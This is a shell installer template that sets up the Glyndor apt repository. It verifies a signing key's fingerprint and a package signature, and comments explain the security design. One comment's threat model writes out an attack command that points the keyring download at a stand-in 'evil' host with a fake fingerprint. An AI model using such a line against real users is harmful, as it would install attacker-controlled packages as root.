#!/bin/sh
# Set up the Glyndor apt repository and install @PRODUCT@.
#
# Usage: curl -fsSL https://apt.glyndor.net/install/@PRODUCT@ | sudo sh
#
# Generated from scripts/install-template.sh in Glyndor/apt. Do not edit the
# published copy - edit the template.
#
# @PRODUCT@ ships as a signed .deb, so apt is the install: it verifies every
# package on every upgrade rather than once, and `apt upgrade` is what keeps the
# machine current. A binary dropped somewhere by hand stays on the version it
# was installed at until somebody remembers it.
#
# Installing through apt also brings in what @PRODUCT@ declares it needs, and
# apt installs Recommends as well as Depends by default.
#
# This sentence has been wrong twice, in opposite directions, so it is written
# to survive being read for a product it was not written about. It first named
# podman and podup specifically: true of epistle, the only product generated
# from this template at the time, and false the moment the template rendered
# for anything else. The correction then said podup recommends podman alone,
# which stopped being true when podup moved both podman and unattended-upgrades
# to Depends, and stayed on the page for a while after that.
#
# The template is shared, so nothing here can name a product's dependencies and
# stay true. What holds for every product is the mechanism, which is the only
# thing this says now.
set -eu

DEFAULT_URL="https://apt.glyndor.net/glyndor-archive-keyring.deb"
KEYRING_URL="${KEYRING_URL:-$DEFAULT_URL}"
KEYRING_PATH="/usr/share/keyrings/glyndor.gpg"

# Derived rather than overridable, deliberately. A separate variable would let a
# copied command line point the package at one host and its signature at
# another, which is the one arrangement that makes the check below meaningless.
# Moving the package moves its signature with it.
KEYRING_SIG_URL="$KEYRING_URL.asc"

# Fingerprint of the archive signing key. Downloading the keyring package is the
# one step that has nothing but the transport behind it; checking what it
# installed against this constant is what closes that window. Override for a
# fork with GLYNDOR_APT_FPR.
#
# Spaces are stripped and the value is upper-cased before it is compared, so
# the grouped form gpg prints and the README publishes -- "9ADF 04EA ..." --
# can be pasted straight in. Without that, a fork operator copying the
# published fingerprint gets "does not carry the expected fingerprint", which
# points at the key when the fault is the spaces.
DEFAULT_FPR="9ADF04EA8C3139CDB67303CFA6705C2EA153F3D6"
GLYNDOR_APT_FPR="${GLYNDOR_APT_FPR:-$DEFAULT_FPR}"

# Where the automatic-upgrade settings are written. Overridable so the tests can
# exercise the block for real instead of against a copy of it, which is how the
# block came to have no test at all: it writes as root into /etc, so a suite
# that is not root could only skip it.
#
# This one carries none of the risk the two overrides above carry. They decide
# what is trusted; this only decides where two config files land, and anyone who
# can set it can already run anything. It is still worth naming rather than
# leaving as an undocumented seam.
APT_CONF_D="${APT_CONF_D:-/etc/apt/apt.conf.d}"

# Both overrides above exist for forks and both are silent, which is the part
# worth changing. The attack they enable is not "someone controls your shell" --
# anyone who does needs no override. It is a copied command line:
#
#   KEYRING_URL=http://evil/x.deb GLYNDOR_APT_FPR=DEAD... \
#     curl -fsSL https://apt.glyndor.net/install/@PRODUCT@ | sudo sh
#
# The visible URL is the real one. Everything that would have made the
# substitution obvious is in the environment, off the end of what a reader
# checks.
#
# Blocking the override would break the fork it was written for, so instead say
# what is in use. A line on the screen does not stop anyone determined; it
# removes the case where the substitution is invisible to someone who would have
# noticed it.
url_overridden=no
fpr_overridden=no
[ "$KEYRING_URL" = "$DEFAULT_URL" ] || url_overridden=yes
[ "$(printf '%s' "$GLYNDOR_APT_FPR" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]')" \
	= "$DEFAULT_FPR" ] || fpr_overridden=yes

# --- output ------------------------------------------------------------------
#
# This runs under `curl ... | sudo sh`, so stdout is the user's terminal even
# though stdin is a pipe. That makes styled output safe here, but only after
# three separate opt-outs, and every one of them is somebody real:
#
#   [ -t 1 ]        redirected to a file, or read by another program. Escape
#                   sequences written there are not decoration, they are
#                   corruption of text somebody greps later.
#   NO_COLOR        the convention a user sets once for every tool on a machine.
#   TERM=dumb       what emacs shells and some CI runners report.
#
if [ -t 1 ] && [ -z "${NO_COLOR-}" ] && [ "${TERM-}" != dumb ]; then
	ESC="$(printf '\033')"
	DIM="${ESC}[2m"; BOLD="${ESC}[1m"; GREEN="${ESC}[32m"
	RED="${ESC}[31m"; OFF="${ESC}[0m"; CLR="${ESC}[2K"
else
	DIM=""; BOLD=""; GREEN=""; RED=""; OFF=""; CLR=""
fi

# The glyphs are U+2714 and U+2716. On a machine whose locale is not UTF-8 those
# bytes render as mojibake, so the test is on the charset rather than on the
# terminal -- it is the locale that decides whether the glyph arrives intact,
# and a Docker image with no locales set is the common case, not an exotic one.
case "${LC_ALL:-${LC_CTYPE:-${LANG-}}}" in
	*UTF-8*|*utf8*|*UTF8*) TICK="✔"; CROSS="✖"; DOT="·" ;;
	*)                     TICK="+"; CROSS="!"; DOT="-" ;;
esac

# %b is what expands the colour variables: POSIX printf does not interpret
# escapes inside %s, and `echo -e` is not portable to dash, which is the shell
# that actually runs this on Debian and Ubuntu.
#
# A step with no value prints no padding and no empty colour pair. Trailing
# whitespace and a bare reset are invisible on a terminal and are exactly what
# somebody diffing two install logs sees as a change that is not there.
step() {
	[ -n "$CLR" ] && printf '\r%b' "$CLR"
	if [ -n "${2-}" ]; then
		printf '  %b%s%b %-32s%b%s%b\n' "$GREEN" "$TICK" "$OFF" "$1" "$DIM" "$2" "$OFF"
	else
		printf '  %b%s%b %s\n' "$GREEN" "$TICK" "$OFF" "$1"
	fi
}

# Only on a terminal, and deliberately not a spinner: this line is overwritten
# by the next step(), so anything that survives into a log file would be a
# half-finished sentence claiming work that may not have happened.
doing() { [ -n "$CLR" ] || return 0; printf '  %b%s %s%b' "$DIM" "$DOT" "$1" "$OFF"; }

note() { printf '      %b%s%b\n' "$DIM" "$1" "$OFF"; }

banner() { printf '\n  %b%s%b %s %b%s%b\n\n' "$BOLD" "Glyndor" "$OFF" "$DOT" "$BOLD" "$1" "$OFF"; }
closing() { printf '\n  %b%s%b %s %b%s%b\n\n' "$BOLD" "$1" "$OFF" "$DOT" "$DIM" "$2" "$OFF"; }

fail() {
	[ -n "$CLR" ] && printf '\r%b' "$CLR"
	printf '  %b%s%b %s\n' "$RED" "$CROSS" "$OFF" "error: $1" >&2
	exit 1
}
# Whether unattended-upgrades would actually touch THIS archive, which is a
# different question from whether it runs at all. Printing "already on" from the
# switch alone said the second and implied the first (#194).
#
# Read through `apt-config dump` rather than by opening files. The entry may
# come from any file in apt.conf.d, and this is apt parsing its own
# configuration instead of us reproducing its precedence rules.
#
# Three ways to be excluded, and checking one of them is exactly how a check
# reports success while the machine sits frozen:
#
#   Allowed-Origins     what our keyring writes
#   Origins-Pattern     a second, equally valid list -- the unattended-upgrades
#                       README says one OR the other, so a check that knows only
#                       the spelling we ship is right on every machine we
#                       configured and wrong on the operator's
#   Package-Blacklist   origin allowed, package vetoed by name
#
# Unknown stays distinguishable from broken: if apt-config cannot be read there
# is nothing to report, and inventing a warning there would train people to
# ignore the one that matters.
archive_upgrade_state() { # prints: allowed | no-origin | blacklisted | unknown
	_dump="$(apt-config dump 2>/dev/null)" || { echo unknown; return 0; }
	[ -n "$_dump" ] || { echo unknown; return 0; }

	# Match the origin name rather than the exact entry. Ours is
	# "Glyndor:stable"; an operator may equally have written
	# "origin=Glyndor" or "o=Glyndor,a=stable" in the other list, and all
	# three mean this archive is covered.
	printf '%s\n' "$_dump" \
		| grep -E '^Unattended-Upgrade::(Allowed-Origins|Origins-Pattern)::' \
		| grep -q 'Glyndor' || { echo no-origin; return 0; }

	# Blacklist entries are regular expressions, so this catches the plain
	# spelling and not every pattern that could match. A miss here leaves the
	# message as it is today rather than making it wrong, which is the right
	# direction to be incomplete in.
	printf '%s\n' "$_dump" \
		| grep -E '^Unattended-Upgrade::Package-Blacklist::' \
		| grep -q '"@PRODUCT@"' && { echo blacklisted; return 0; }

	echo allowed
}

# Whether unattended-upgrades is scheduled to fetch and apply updates on its
# own. The previous shortcut asked "does the file by that name exist" and
# answered "already on" on that basis, so a file containing
# APT::Periodic::Unattended-Upgrade "0" was reported as on to the operator
# who wrote it. Reading apt-config's own dump is the smallest change that
# fixes that, since the value can come from any file in apt.conf.d and apt
# is the thing that knows its own precedence.
#
# Three responses, the same shape as archive_upgrade_state above:
#
#   on       APT::Periodic::Unattended-Upgrade is "1" and Update-Package-Lists
#            is also "1". The installer leaves it alone.
#   off      one of the two APT::Periodic keys is at "0". Update-Package-
#            Lists "0" alone is enough: no list refresh, so even with
#            Unattended-Upgrade "1" there is nothing to upgrade. The previous
#            branch silently flipped this to "1".
#   unknown  no APT::Periodic keys are set, or `apt-config` cannot be read.
#            A machine with no keys can run unattended-upgrades on a systemd
#            timer, and a binary on/off check would write settings the
#            operator did not ask for. The installer reports this and
#            writes nothing.
# What this must never go back to, recorded because the reason is not
# reconstructable from the code that remains.
#
# The question was once asked as `dpkg -s unattended-upgrades`, meaning "is the
# package absent" rather than "is the schedule off". That was a safe proxy only
# while no product on this archive pulled the package in, and it stopped being
# one the moment a product did: `apt-get install @PRODUCT@` runs earlier in this
# script and passes no `--no-install-recommends`, so a product that merely
# recommends unattended-upgrades installs it too. The test then read true on a
# machine that had never seen the package, the other branch became unreachable,
# and the installer reported success having switched nothing on. It was reported
# from Glyndor/podup, whose debian/control came to read
# `Depends: ... unattended-upgrades`.
#
# The missing switch was not the whole cost. `52glyndor-safety`, the file that
# stops an unattended upgrade rebooting a server on its own, is written in the
# same branch and would have gone with it.
#
# Reading apt-config replaces both the package test and the file test, and it
# answers the question that was being asked all along.
upgrade_switch_state() { # prints: on | off | unknown
	_dump="$(apt-config dump 2>/dev/null)" || { echo unknown; return 0; }
	[ -n "$_dump" ] || { echo unknown; return 0; }

	# Either of the two APT::Periodic keys at "0" disables the schedule.
	# Update-Package-Lists "0" alone is enough: no list refresh, so even
	# with Unattended-Upgrade "1" there is nothing to upgrade. The previous
	# shortcut silently wrote "1" on top of this.
	if printf '%s\n' "$_dump" \
		| grep -qE '^APT::Periodic::(Unattended-Upgrade|Update-Package-Lists) "0"'; then
		echo off
		return 0
	fi

	# Both keys at "1" is what this installer writes and what Ubuntu ships
	# with on its switch file. Missing one is unknown, not on: a systemd
	# timer can run unattended-upgrades with either key unset, and we
	# cannot read the timer here.
	if printf '%s\n' "$_dump" \
		| grep -qE '^APT::Periodic::Unattended-Upgrade "1"' \
		&& printf '%s\n' "$_dump" \
		| grep -qE '^APT::Periodic::Update-Package-Lists "1"'; then
		echo on
		return 0
	fi

	echo unknown
}

# --- end output --------------------------------------------------------------

[ "$(id -u)" -eq 0 ] || fail "run this as root: curl -fsSL https://apt.glyndor.net/install/@PRODUCT@ | sudo sh"

command -v apt-get >/dev/null 2>&1 \
	|| fail "no apt-get found. @PRODUCT@ ships as a .deb; on a non-Debian system, build from source (https://github.com/Glyndor/@PRODUCT@)"
command -v dpkg >/dev/null 2>&1 || fail "no dpkg found"
# dpkg-deb ships inside the dpkg package, so this guard is redundant on a sane
# system. It is here so that a stripped-down image fails with a clear message
# instead of "dpkg-deb: command not found" halfway through the keyring step.
command -v dpkg-deb >/dev/null 2>&1 || fail "no dpkg-deb found"

workdir=
installed_gnupg=

# Leaves nothing of its own behind, on every exit path including the failures:
# the downloaded keyring package, and gnupg if this script is what pulled it in.
cleanup() {
	[ -n "$workdir" ] && rm -rf "$workdir"
	if [ -n "$installed_gnupg" ]; then
		note "removing the gnupg this script installed"
		apt-get purge -y -qq --auto-remove gnupg >/dev/null 2>&1 || true
	fi
	return 0
}
trap cleanup EXIT

# gpg comes from the distribution's own trusted repositories, not ours, so
# installing it here does not widen what has to be trusted. It is needed for one
# fingerprint read and nothing else, so it goes back out again afterwards -
# purged with --auto-remove, and only when it was absent to begin with.
if ! command -v gpg >/dev/null 2>&1; then
	doing "installing gnupg, needed to check the archive key"
	apt-get update -qq
	apt-get install -y -qq gnupg || fail "could not install gnupg"
	installed_gnupg=yes
fi

workdir=$(mktemp -d)

# Printed after the tool checks, so the message lands on a machine that can act
# on it rather than scrolling past a "no apt-get found" a moment later.
if [ "$url_overridden" = yes ] || [ "$fpr_overridden" = yes ]; then
	echo "NOTE: this is not the stock Glyndor install." >&2
	[ "$url_overridden" = no ] || echo "  keyring source: $KEYRING_URL (default is $DEFAULT_URL)" >&2
	[ "$fpr_overridden" = no ] || echo "  expected key:   $GLYNDOR_APT_FPR (default is $DEFAULT_FPR)" >&2
	if [ "$url_overridden" = yes ] && [ "$fpr_overridden" = yes ]; then
		echo "  Both were replaced, so nothing here is checked against Glyndor's" >&2
		echo "  published key. That is correct for a fork and wrong for anything else." >&2
	fi
fi

banner "@PRODUCT@"
doing "downloading the archive keyring"
# Bounded, and redirects kept on https.
#
# The keyring is ~2 KB and stays kilobytes even carrying both keys through a
# rotation, so 8 MB is four thousand times the real size and still refuses a
# server that answers a 2 KB request with an endless body. Without it the only
# limit is the disk: this runs as root, and /tmp filling up takes the machine
# with it, before any fingerprint is ever compared.
#
# --proto-redir=https keeps -L from being talked down to http:// by a redirect.
# The fingerprint check would still refuse whatever arrived, but there is no
# reason to fetch a trust anchor over a downgraded connection to find out.
# --connect-timeout 20 --max-time 300 keeps a stalled connection from hanging
# the installer indefinitely. --max-filesize bounds the bytes and not the
# clock: measured against a server streaming 100 bytes per second, a curl with
# the size cap and no deadline ran until it was killed, and the same call with
# --max-time returned exit 28 on time. The numbers are generous on purpose,
# because this runs on a user's link rather than on a runner, and the package
# is a few kilobytes against an 8 MB ceiling.
curl -fsSL --proto-redir =https --max-filesize $((8 * 1024 * 1024)) \
	--connect-timeout 20 --max-time 300 \
	-o "$workdir/glyndor-archive-keyring.deb" "$KEYRING_URL" \
	|| fail "could not download $KEYRING_URL (over 8 MB, or the transfer failed)"

# And the detached signature over it, under the same bounds against a smaller
# ceiling: an armoured Ed25519 signature is a few hundred bytes.
#
# Fetched here rather than after the checks below so that both halves of what
# is served arrive together. A server that answers with the package and not the
# signature is refused before anything is unpacked.
curl -fsSL --proto-redir =https --max-filesize $((64 * 1024)) \
	--connect-timeout 20 --max-time 300 \
	-o "$workdir/glyndor-archive-keyring.deb.asc" "$KEYRING_SIG_URL" \
	|| fail "could not download $KEYRING_SIG_URL (over 64 KB, or the transfer failed)"

# Extract WITHOUT installing. `dpkg-deb -x` unpacks the data archive and runs no
# maintainer script, so nothing from the downloaded package executes until its
# key has been checked. `dpkg -i` here would run preinst/postinst as root, and
# those scripts can write the very keyring the check below reads -- with the
# expected fingerprint alongside an attacker's, which the presence test admits.
# Normalise here rather than where the constant is set: `tr` must not be
# needed before the guards above have established that this is a Debian system
# with the tools the installer uses. Reaching for a command ahead of the check
# that the environment has it is how a "no apt-get found" refusal turns into
# "tr: command not found".
# One fingerprint per line, spaces stripped and upper-cased, so the grouped form
# gpg prints can be pasted in and several can be given separated by commas.
GLYNDOR_APT_FPR="$(printf '%s' "$GLYNDOR_APT_FPR" \
	| tr ',' '\n' | tr -d '[:blank:]' | tr '[:lower:]' '[:upper:]' | grep -v '^$')"

step "Archive keyring downloaded"
doing "checking the archive key fingerprint"
mkdir -p "$workdir/extracted"
dpkg-deb -x "$workdir/glyndor-archive-keyring.deb" "$workdir/extracted" \
	|| fail "could not extract the keyring package"

# EVERY key in the keyring must be one this installer was told to expect, not
# just one of them. The presence test this replaces admitted a keyring that
# carried the published key alongside an attacker's: apt then trusted both, and
# the sources.list the same package installs decides where it fetches from. That
# is what an attacker who can serve this .deb needs, and the published
# fingerprint does not stop it, because the published fingerprint is right there.
#
# A rotation still works: during the overlap the keyring carries the old key and
# the new one, so GLYNDOR_APT_FPR carries both. The order matters now -- publish
# both fingerprints BEFORE publishing the keyring that carries both, or clients
# refuse the new keyring until the second one is out.
#
# Only primary fingerprints are compared. `--with-colons` emits an `fpr:` line
# per subkey as well, and a subkey's fingerprint is not something anyone
# publishes; taking the first `fpr:` after each `pub:` is what isolates them.
keyring_fprs="$(gpg --show-keys --with-colons "$workdir/extracted$KEYRING_PATH" 2>/dev/null \
	| awk -F: '/^pub:/{want=1;next} /^fpr:/{if(want){print $10;want=0}}')"

# Do not remove this guard on the grounds that `set -e` covers it. It does not,
# and the reason is the interpreter rather than the logic.
#
# This is the only script here with a `#!/bin/sh` line, because it is fetched
# and piped into `sh`; every other script in this repository is bash and runs
# with `set -euo pipefail`. `pipefail` is not POSIX. It reached dash in 0.5.12,
# released in 2023, and this archive serves distributions older than that, so
# the option cannot be set here.
#
# Without it a pipeline exits with the status of its LAST command. In the
# assignment above, a gpg that fails writes nothing to stdout, its stderr is
# discarded, awk then reads empty input and exits 0, and the pipeline exits 0.
# `set -e` sees success. `keyring_fprs` is empty, the `for` loop below iterates
# zero times, every comparison it would have made is skipped, and the script
# walks into `dpkg -i` having verified nothing.
#
# This line is what turns that into a refusal.
[ -n "$keyring_fprs" ] \
	|| fail "the downloaded package carries no archive key at all; nothing was installed"

for fpr in $keyring_fprs; do
	printf '%s\n' "$GLYNDOR_APT_FPR" | grep -qxF "$fpr" || fail \
		"the downloaded keyring carries a key this installer was not told to expect ($fpr); nothing was installed"
done

# The fingerprint is printed rather than folded into the tick above. It is the
# one line of this output that a reader is asked to act on -- comparing it
# against README.md is what distinguishes this archive from one impersonating
# it -- and a check nobody can see is a check nobody performs.
step "Key fingerprint verified"
printf '%s\n' "$GLYNDOR_APT_FPR" | while IFS= read -r f; do
	[ -n "$f" ] || continue
	note "$(printf '%s' "$f" | sed -E 's/(.{4})/\1 /g; s/ $//; s/^(([0-9A-F]{4} ){5})/\1 /')"
done
doing "checking the archive signature"

# The check above authenticates the KEY. It says nothing about the package that
# carried it, and the package is what runs as root a few lines down.
#
# Two payloads pass everything up to this point. A substituted .deb can ship the
# genuine key alongside a hostile postinst, which `dpkg -i` executes. It can
# also ship a glyndor.sources carrying `Trusted: yes`, which turns off
# verification for everything apt subsequently fetches from that source, and
# needs no maintainer script at all. The precondition for both is the one this
# script already trusts once: whoever can serve the download.
#
# So verify the detached signature over the WHOLE package with the key that was
# just authenticated. The pinned fingerprint authenticates the key, the key
# authenticates the bytes. Substituting the package means keeping the genuine
# key to get past the fingerprint check, and then being unable to produce a
# signature over the substituted bytes here.
#
# gpg and not gpgv, although gpgv is the narrower tool. gpg is already
# guaranteed: the block near the top installs gnupg when it is missing and the
# exit trap purges it again. gpgv is a separate binary that apt declares as
# `gpgv | gpgv2 | gpgv1` on some releases, and Debian trixie's apt depends on
# sqv instead, so requiring it would mean provisioning and removing a second
# package for one call.
#
# The exit status is the entire result, read directly rather than by grepping
# the output for "Good signature". That text is localised, and the pipeline
# trap described further up applies here as well.
#
# Measured with gpg 2.4.8, with the key present ONLY in --keyring and never
# imported into any trust store: a good signature exits 0, a package modified
# after signing exits 1, and a signature made by a key outside the keyring, a
# truncated one, an empty one and an absent file all exit 2. That an untrusted
# key still exits 0 is what makes --keyring on its own the right shape here:
# trust is not gpg's to decide, it comes from the fingerprint check above.
#
# The keyring argument has to be absolute. gpg resolves a bare relative
# --keyring path against GNUPGHOME rather than the working directory and then
# does not find the key, with nothing on screen saying so: measured, the call
# that exits 0 with an absolute path exits 2 with the same file named
# relatively. $workdir comes from `mktemp -d`, so it is absolute.
#
# GNUPGHOME points inside the work directory so that verifying leaves nothing
# behind on the machine, the same promise the rest of this script keeps. stdin
# is redirected because this script is itself being read from stdin by the shell
# running it, and an unredirected child would consume the rest of the program.
mkdir -p "$workdir/gnupg"
chmod 700 "$workdir/gnupg"
GNUPGHOME="$workdir/gnupg" gpg --no-default-keyring \
	--keyring "$workdir/extracted$KEYRING_PATH" \
	--verify "$workdir/glyndor-archive-keyring.deb.asc" \
	"$workdir/glyndor-archive-keyring.deb" </dev/null >/dev/null 2>&1 \
	|| fail "the downloaded package is not signed by the archive key it carries; nothing was installed"

step "Package signature verified"

doing "installing the keyring"
dpkg -i "$workdir/glyndor-archive-keyring.deb" >/dev/null \
	|| fail "could not install the keyring package"

step "Keyring installed"

# apt's own output is the bulk of what this script used to put on screen, and
# almost none of it is about @PRODUCT@: the dependency solver, the autoremove
# hint, and one `N:` line per unrelated file some other vendor left in
# sources.list.d. It is captured and shown only if apt fails, where it is the
# whole diagnosis.
#
# DEBIAN_FRONTEND matters specifically because the output is hidden. Without
# it, a package whose maintainer script asks debconf a question waits for an
# answer behind a screen showing nothing, which reads as a hang.
# Deliberately not -qq on the install. Capturing the output is what keeps the
# ordinary run quiet, so -qq buys nothing there and costs the whole diagnosis
# here: it suppresses the "unmet dependencies" block, leaving only
#
#     E: Unable to correct problems, you have held broken packages.
#
# which does not name the dependency that was not satisfiable. Measured on a
# machine whose podman was older than the Depends asks for -- the line that says
# WHICH package and WHICH version is the line -qq removes.
doing "installing @PRODUCT@"
if ! apt_log="$(DEBIAN_FRONTEND=noninteractive apt-get update -qq 2>&1 \
	&& DEBIAN_FRONTEND=noninteractive apt-get install -y @PRODUCT@ 2>&1)"; then
	# Clear the in-progress line before apt's own output lands, or the two
	# collide on one row and the first thing a reader sees is a sentence
	# spliced out of two programs.
	[ -n "$CLR" ] && printf '\r%b' "$CLR"
	printf '%s\n' "$apt_log" >&2
	fail "apt could not install @PRODUCT@"
fi

# Run the installed binary rather than asking dpkg what version it recorded.
# dpkg answers from its database, so it would report a version for a package
# that unpacked but cannot start; this is the one step that proves what landed
# actually runs. Its last field is the version, and an empty result is left
# empty rather than guessed -- a blank column is honest, an invented one is not.
version_line="$(@PRODUCT@ --version 2>/dev/null || true)"
version="${version_line##* }"
step "@PRODUCT@ installed" "$version"

# Automatic upgrades.
#
# The keyring package puts this archive on unattended-upgrades' allowlist, which
# is the part that is ours to decide. Whether the machine runs unattended
# upgrades at all is the operator's, and the installer reports it from
# `apt-config dump` rather than touching it: a `20auto-upgrades` containing
# APT::Periodic::Unattended-Upgrade "0" is a deliberate "off", and the file-
# existence shortcut it replaces called that "already on" without reading the
# value. The switch state is `upgrade_switch_state` above; the archive side is
# `archive_upgrade_state` further up.
#
# An operator whose machine has the switch off -- or whose machine has never
# had the package installed and a systemd timer drives what arrives -- now sees
# that as the installer's last word and is pointed at the reconfigure command.
# The README's promise that this script "switches automatic security upgrades
# on" is narrower than it was; it now describes the explicit on case and a
# quiet no-op on the others.
#
# Three answers for the switch, three for the archive, with combinations the
# matrix deliberately does not over-promise on. Read in order: on+anything is
# the operator's call (and the case statement below is reached only there);
# off and unknown leave the machine alone.
# --- automatic upgrades ------------------------------------------------------
#
# Delimited because tests/unattended-upgrades.test.sh runs this section in
# isolation. It used to end at the first `fi`, which stopped being the end of it
# when the step moved out of the branches and below the case.

# Empty means the failure branch below already said its piece in red; the
# script runs under `set -u`, so this cannot be left undeclared.
upgrade_switch=""

# Decide what to tell the operator from `upgrade_switch_state`, not from the
# presence of a file by that name. The shortcut this replaces reported a
# switch file with APT::Periodic::Unattended-Upgrade "0" as "already on" and
# went on to overwrite it to "1", and that was the one sentence in this
# script that lied to a human at the moment they trusted it.
#
# The three answers match what `upgrade_switch_state` returns above:
#
#   on       the operator has the schedule on; the case statement further
#            down handles the archive side of what they will be told.
#   off      the operator has one of the APT::Periodic keys at "0". The
#            previous branch silently wrote "1" on top of that. Now reported
#            as their config, with how to change it.
#   unknown  no APT::Periodic keys are set, or apt-config cannot be read. A
#            systemd timer can run unattended-upgrades with neither key, and
#            a binary on/off would write settings the operator did not ask
#            for. Report and write nothing.
case "$(upgrade_switch_state)" in
	on)
		upgrade_switch=kept
		;;
	off)
		printf '  %b%s%b %-32s%b%s%b\n' "$RED" "$CROSS" "$OFF" \
			"Automatic security upgrades" "$DIM" "switched off, left alone" "$OFF" >&2
		note "@PRODUCT@ will not receive security fixes on its own" >&2
		note "switch it on with: sudo dpkg-reconfigure -plow unattended-upgrades" >&2
		;;
	*)
		note "could not determine whether automatic upgrades are on" >&2
		note "@PRODUCT@ may or may not receive security fixes on its own" >&2
		;;
esac

# One line for two facts, when the switch is on: unattended-upgrades runs,
# and it is allowed to touch this archive. Both have to hold for the sentence
# a reader takes away from it -- that @PRODUCT@ stays current on its own -- to
# be true.
if [ "$upgrade_switch" = kept ]; then
	case "$(archive_upgrade_state)" in
		allowed)
			step "Automatic security upgrades" "already on, left alone"
			;;
		no-origin)
			# The keyring was installed moments ago and ships this entry, so
			# reaching here means it was opted out of rather than missing.
			# Say what is true and what to do, and do not undo their choice.
			printf '  %b%s%b %-32s%b%s%b\n' "$RED" "$CROSS" "$OFF" \
				"Automatic security upgrades" "$DIM" \
				"on, but not for this archive" "$OFF" >&2
			note "unattended-upgrades runs, and nothing allows apt.glyndor.net" >&2
			note "so @PRODUCT@ will not be upgraded on its own" >&2
			note "restore it with: dpkg --force-confmiss -i the keyring .deb" >&2
			;;
		blacklisted)
			printf '  %b%s%b %-32s%b%s%b\n' "$RED" "$CROSS" "$OFF" \
				"Automatic security upgrades" "$DIM" \
				"on, but @PRODUCT@ is blacklisted" "$OFF" >&2
			note "Unattended-Upgrade::Package-Blacklist names @PRODUCT@" >&2
			note "so @PRODUCT@ will not be upgraded on its own" >&2
			;;
		*)
			# archive_upgrade_state returned unknown on a switch that is
			# on. The previous branch printed a green tick that implied the
			# archive is allowed; that has not been verified.
			note "automatic upgrades are on, but this archive's allowlist" >&2
			note "could not be verified" >&2
			;;
	esac
fi
# --- end automatic upgrades --------------------------------------------------

closing "@PRODUCT@ $version" "upgrades and archive-key renewals both arrive through apt"
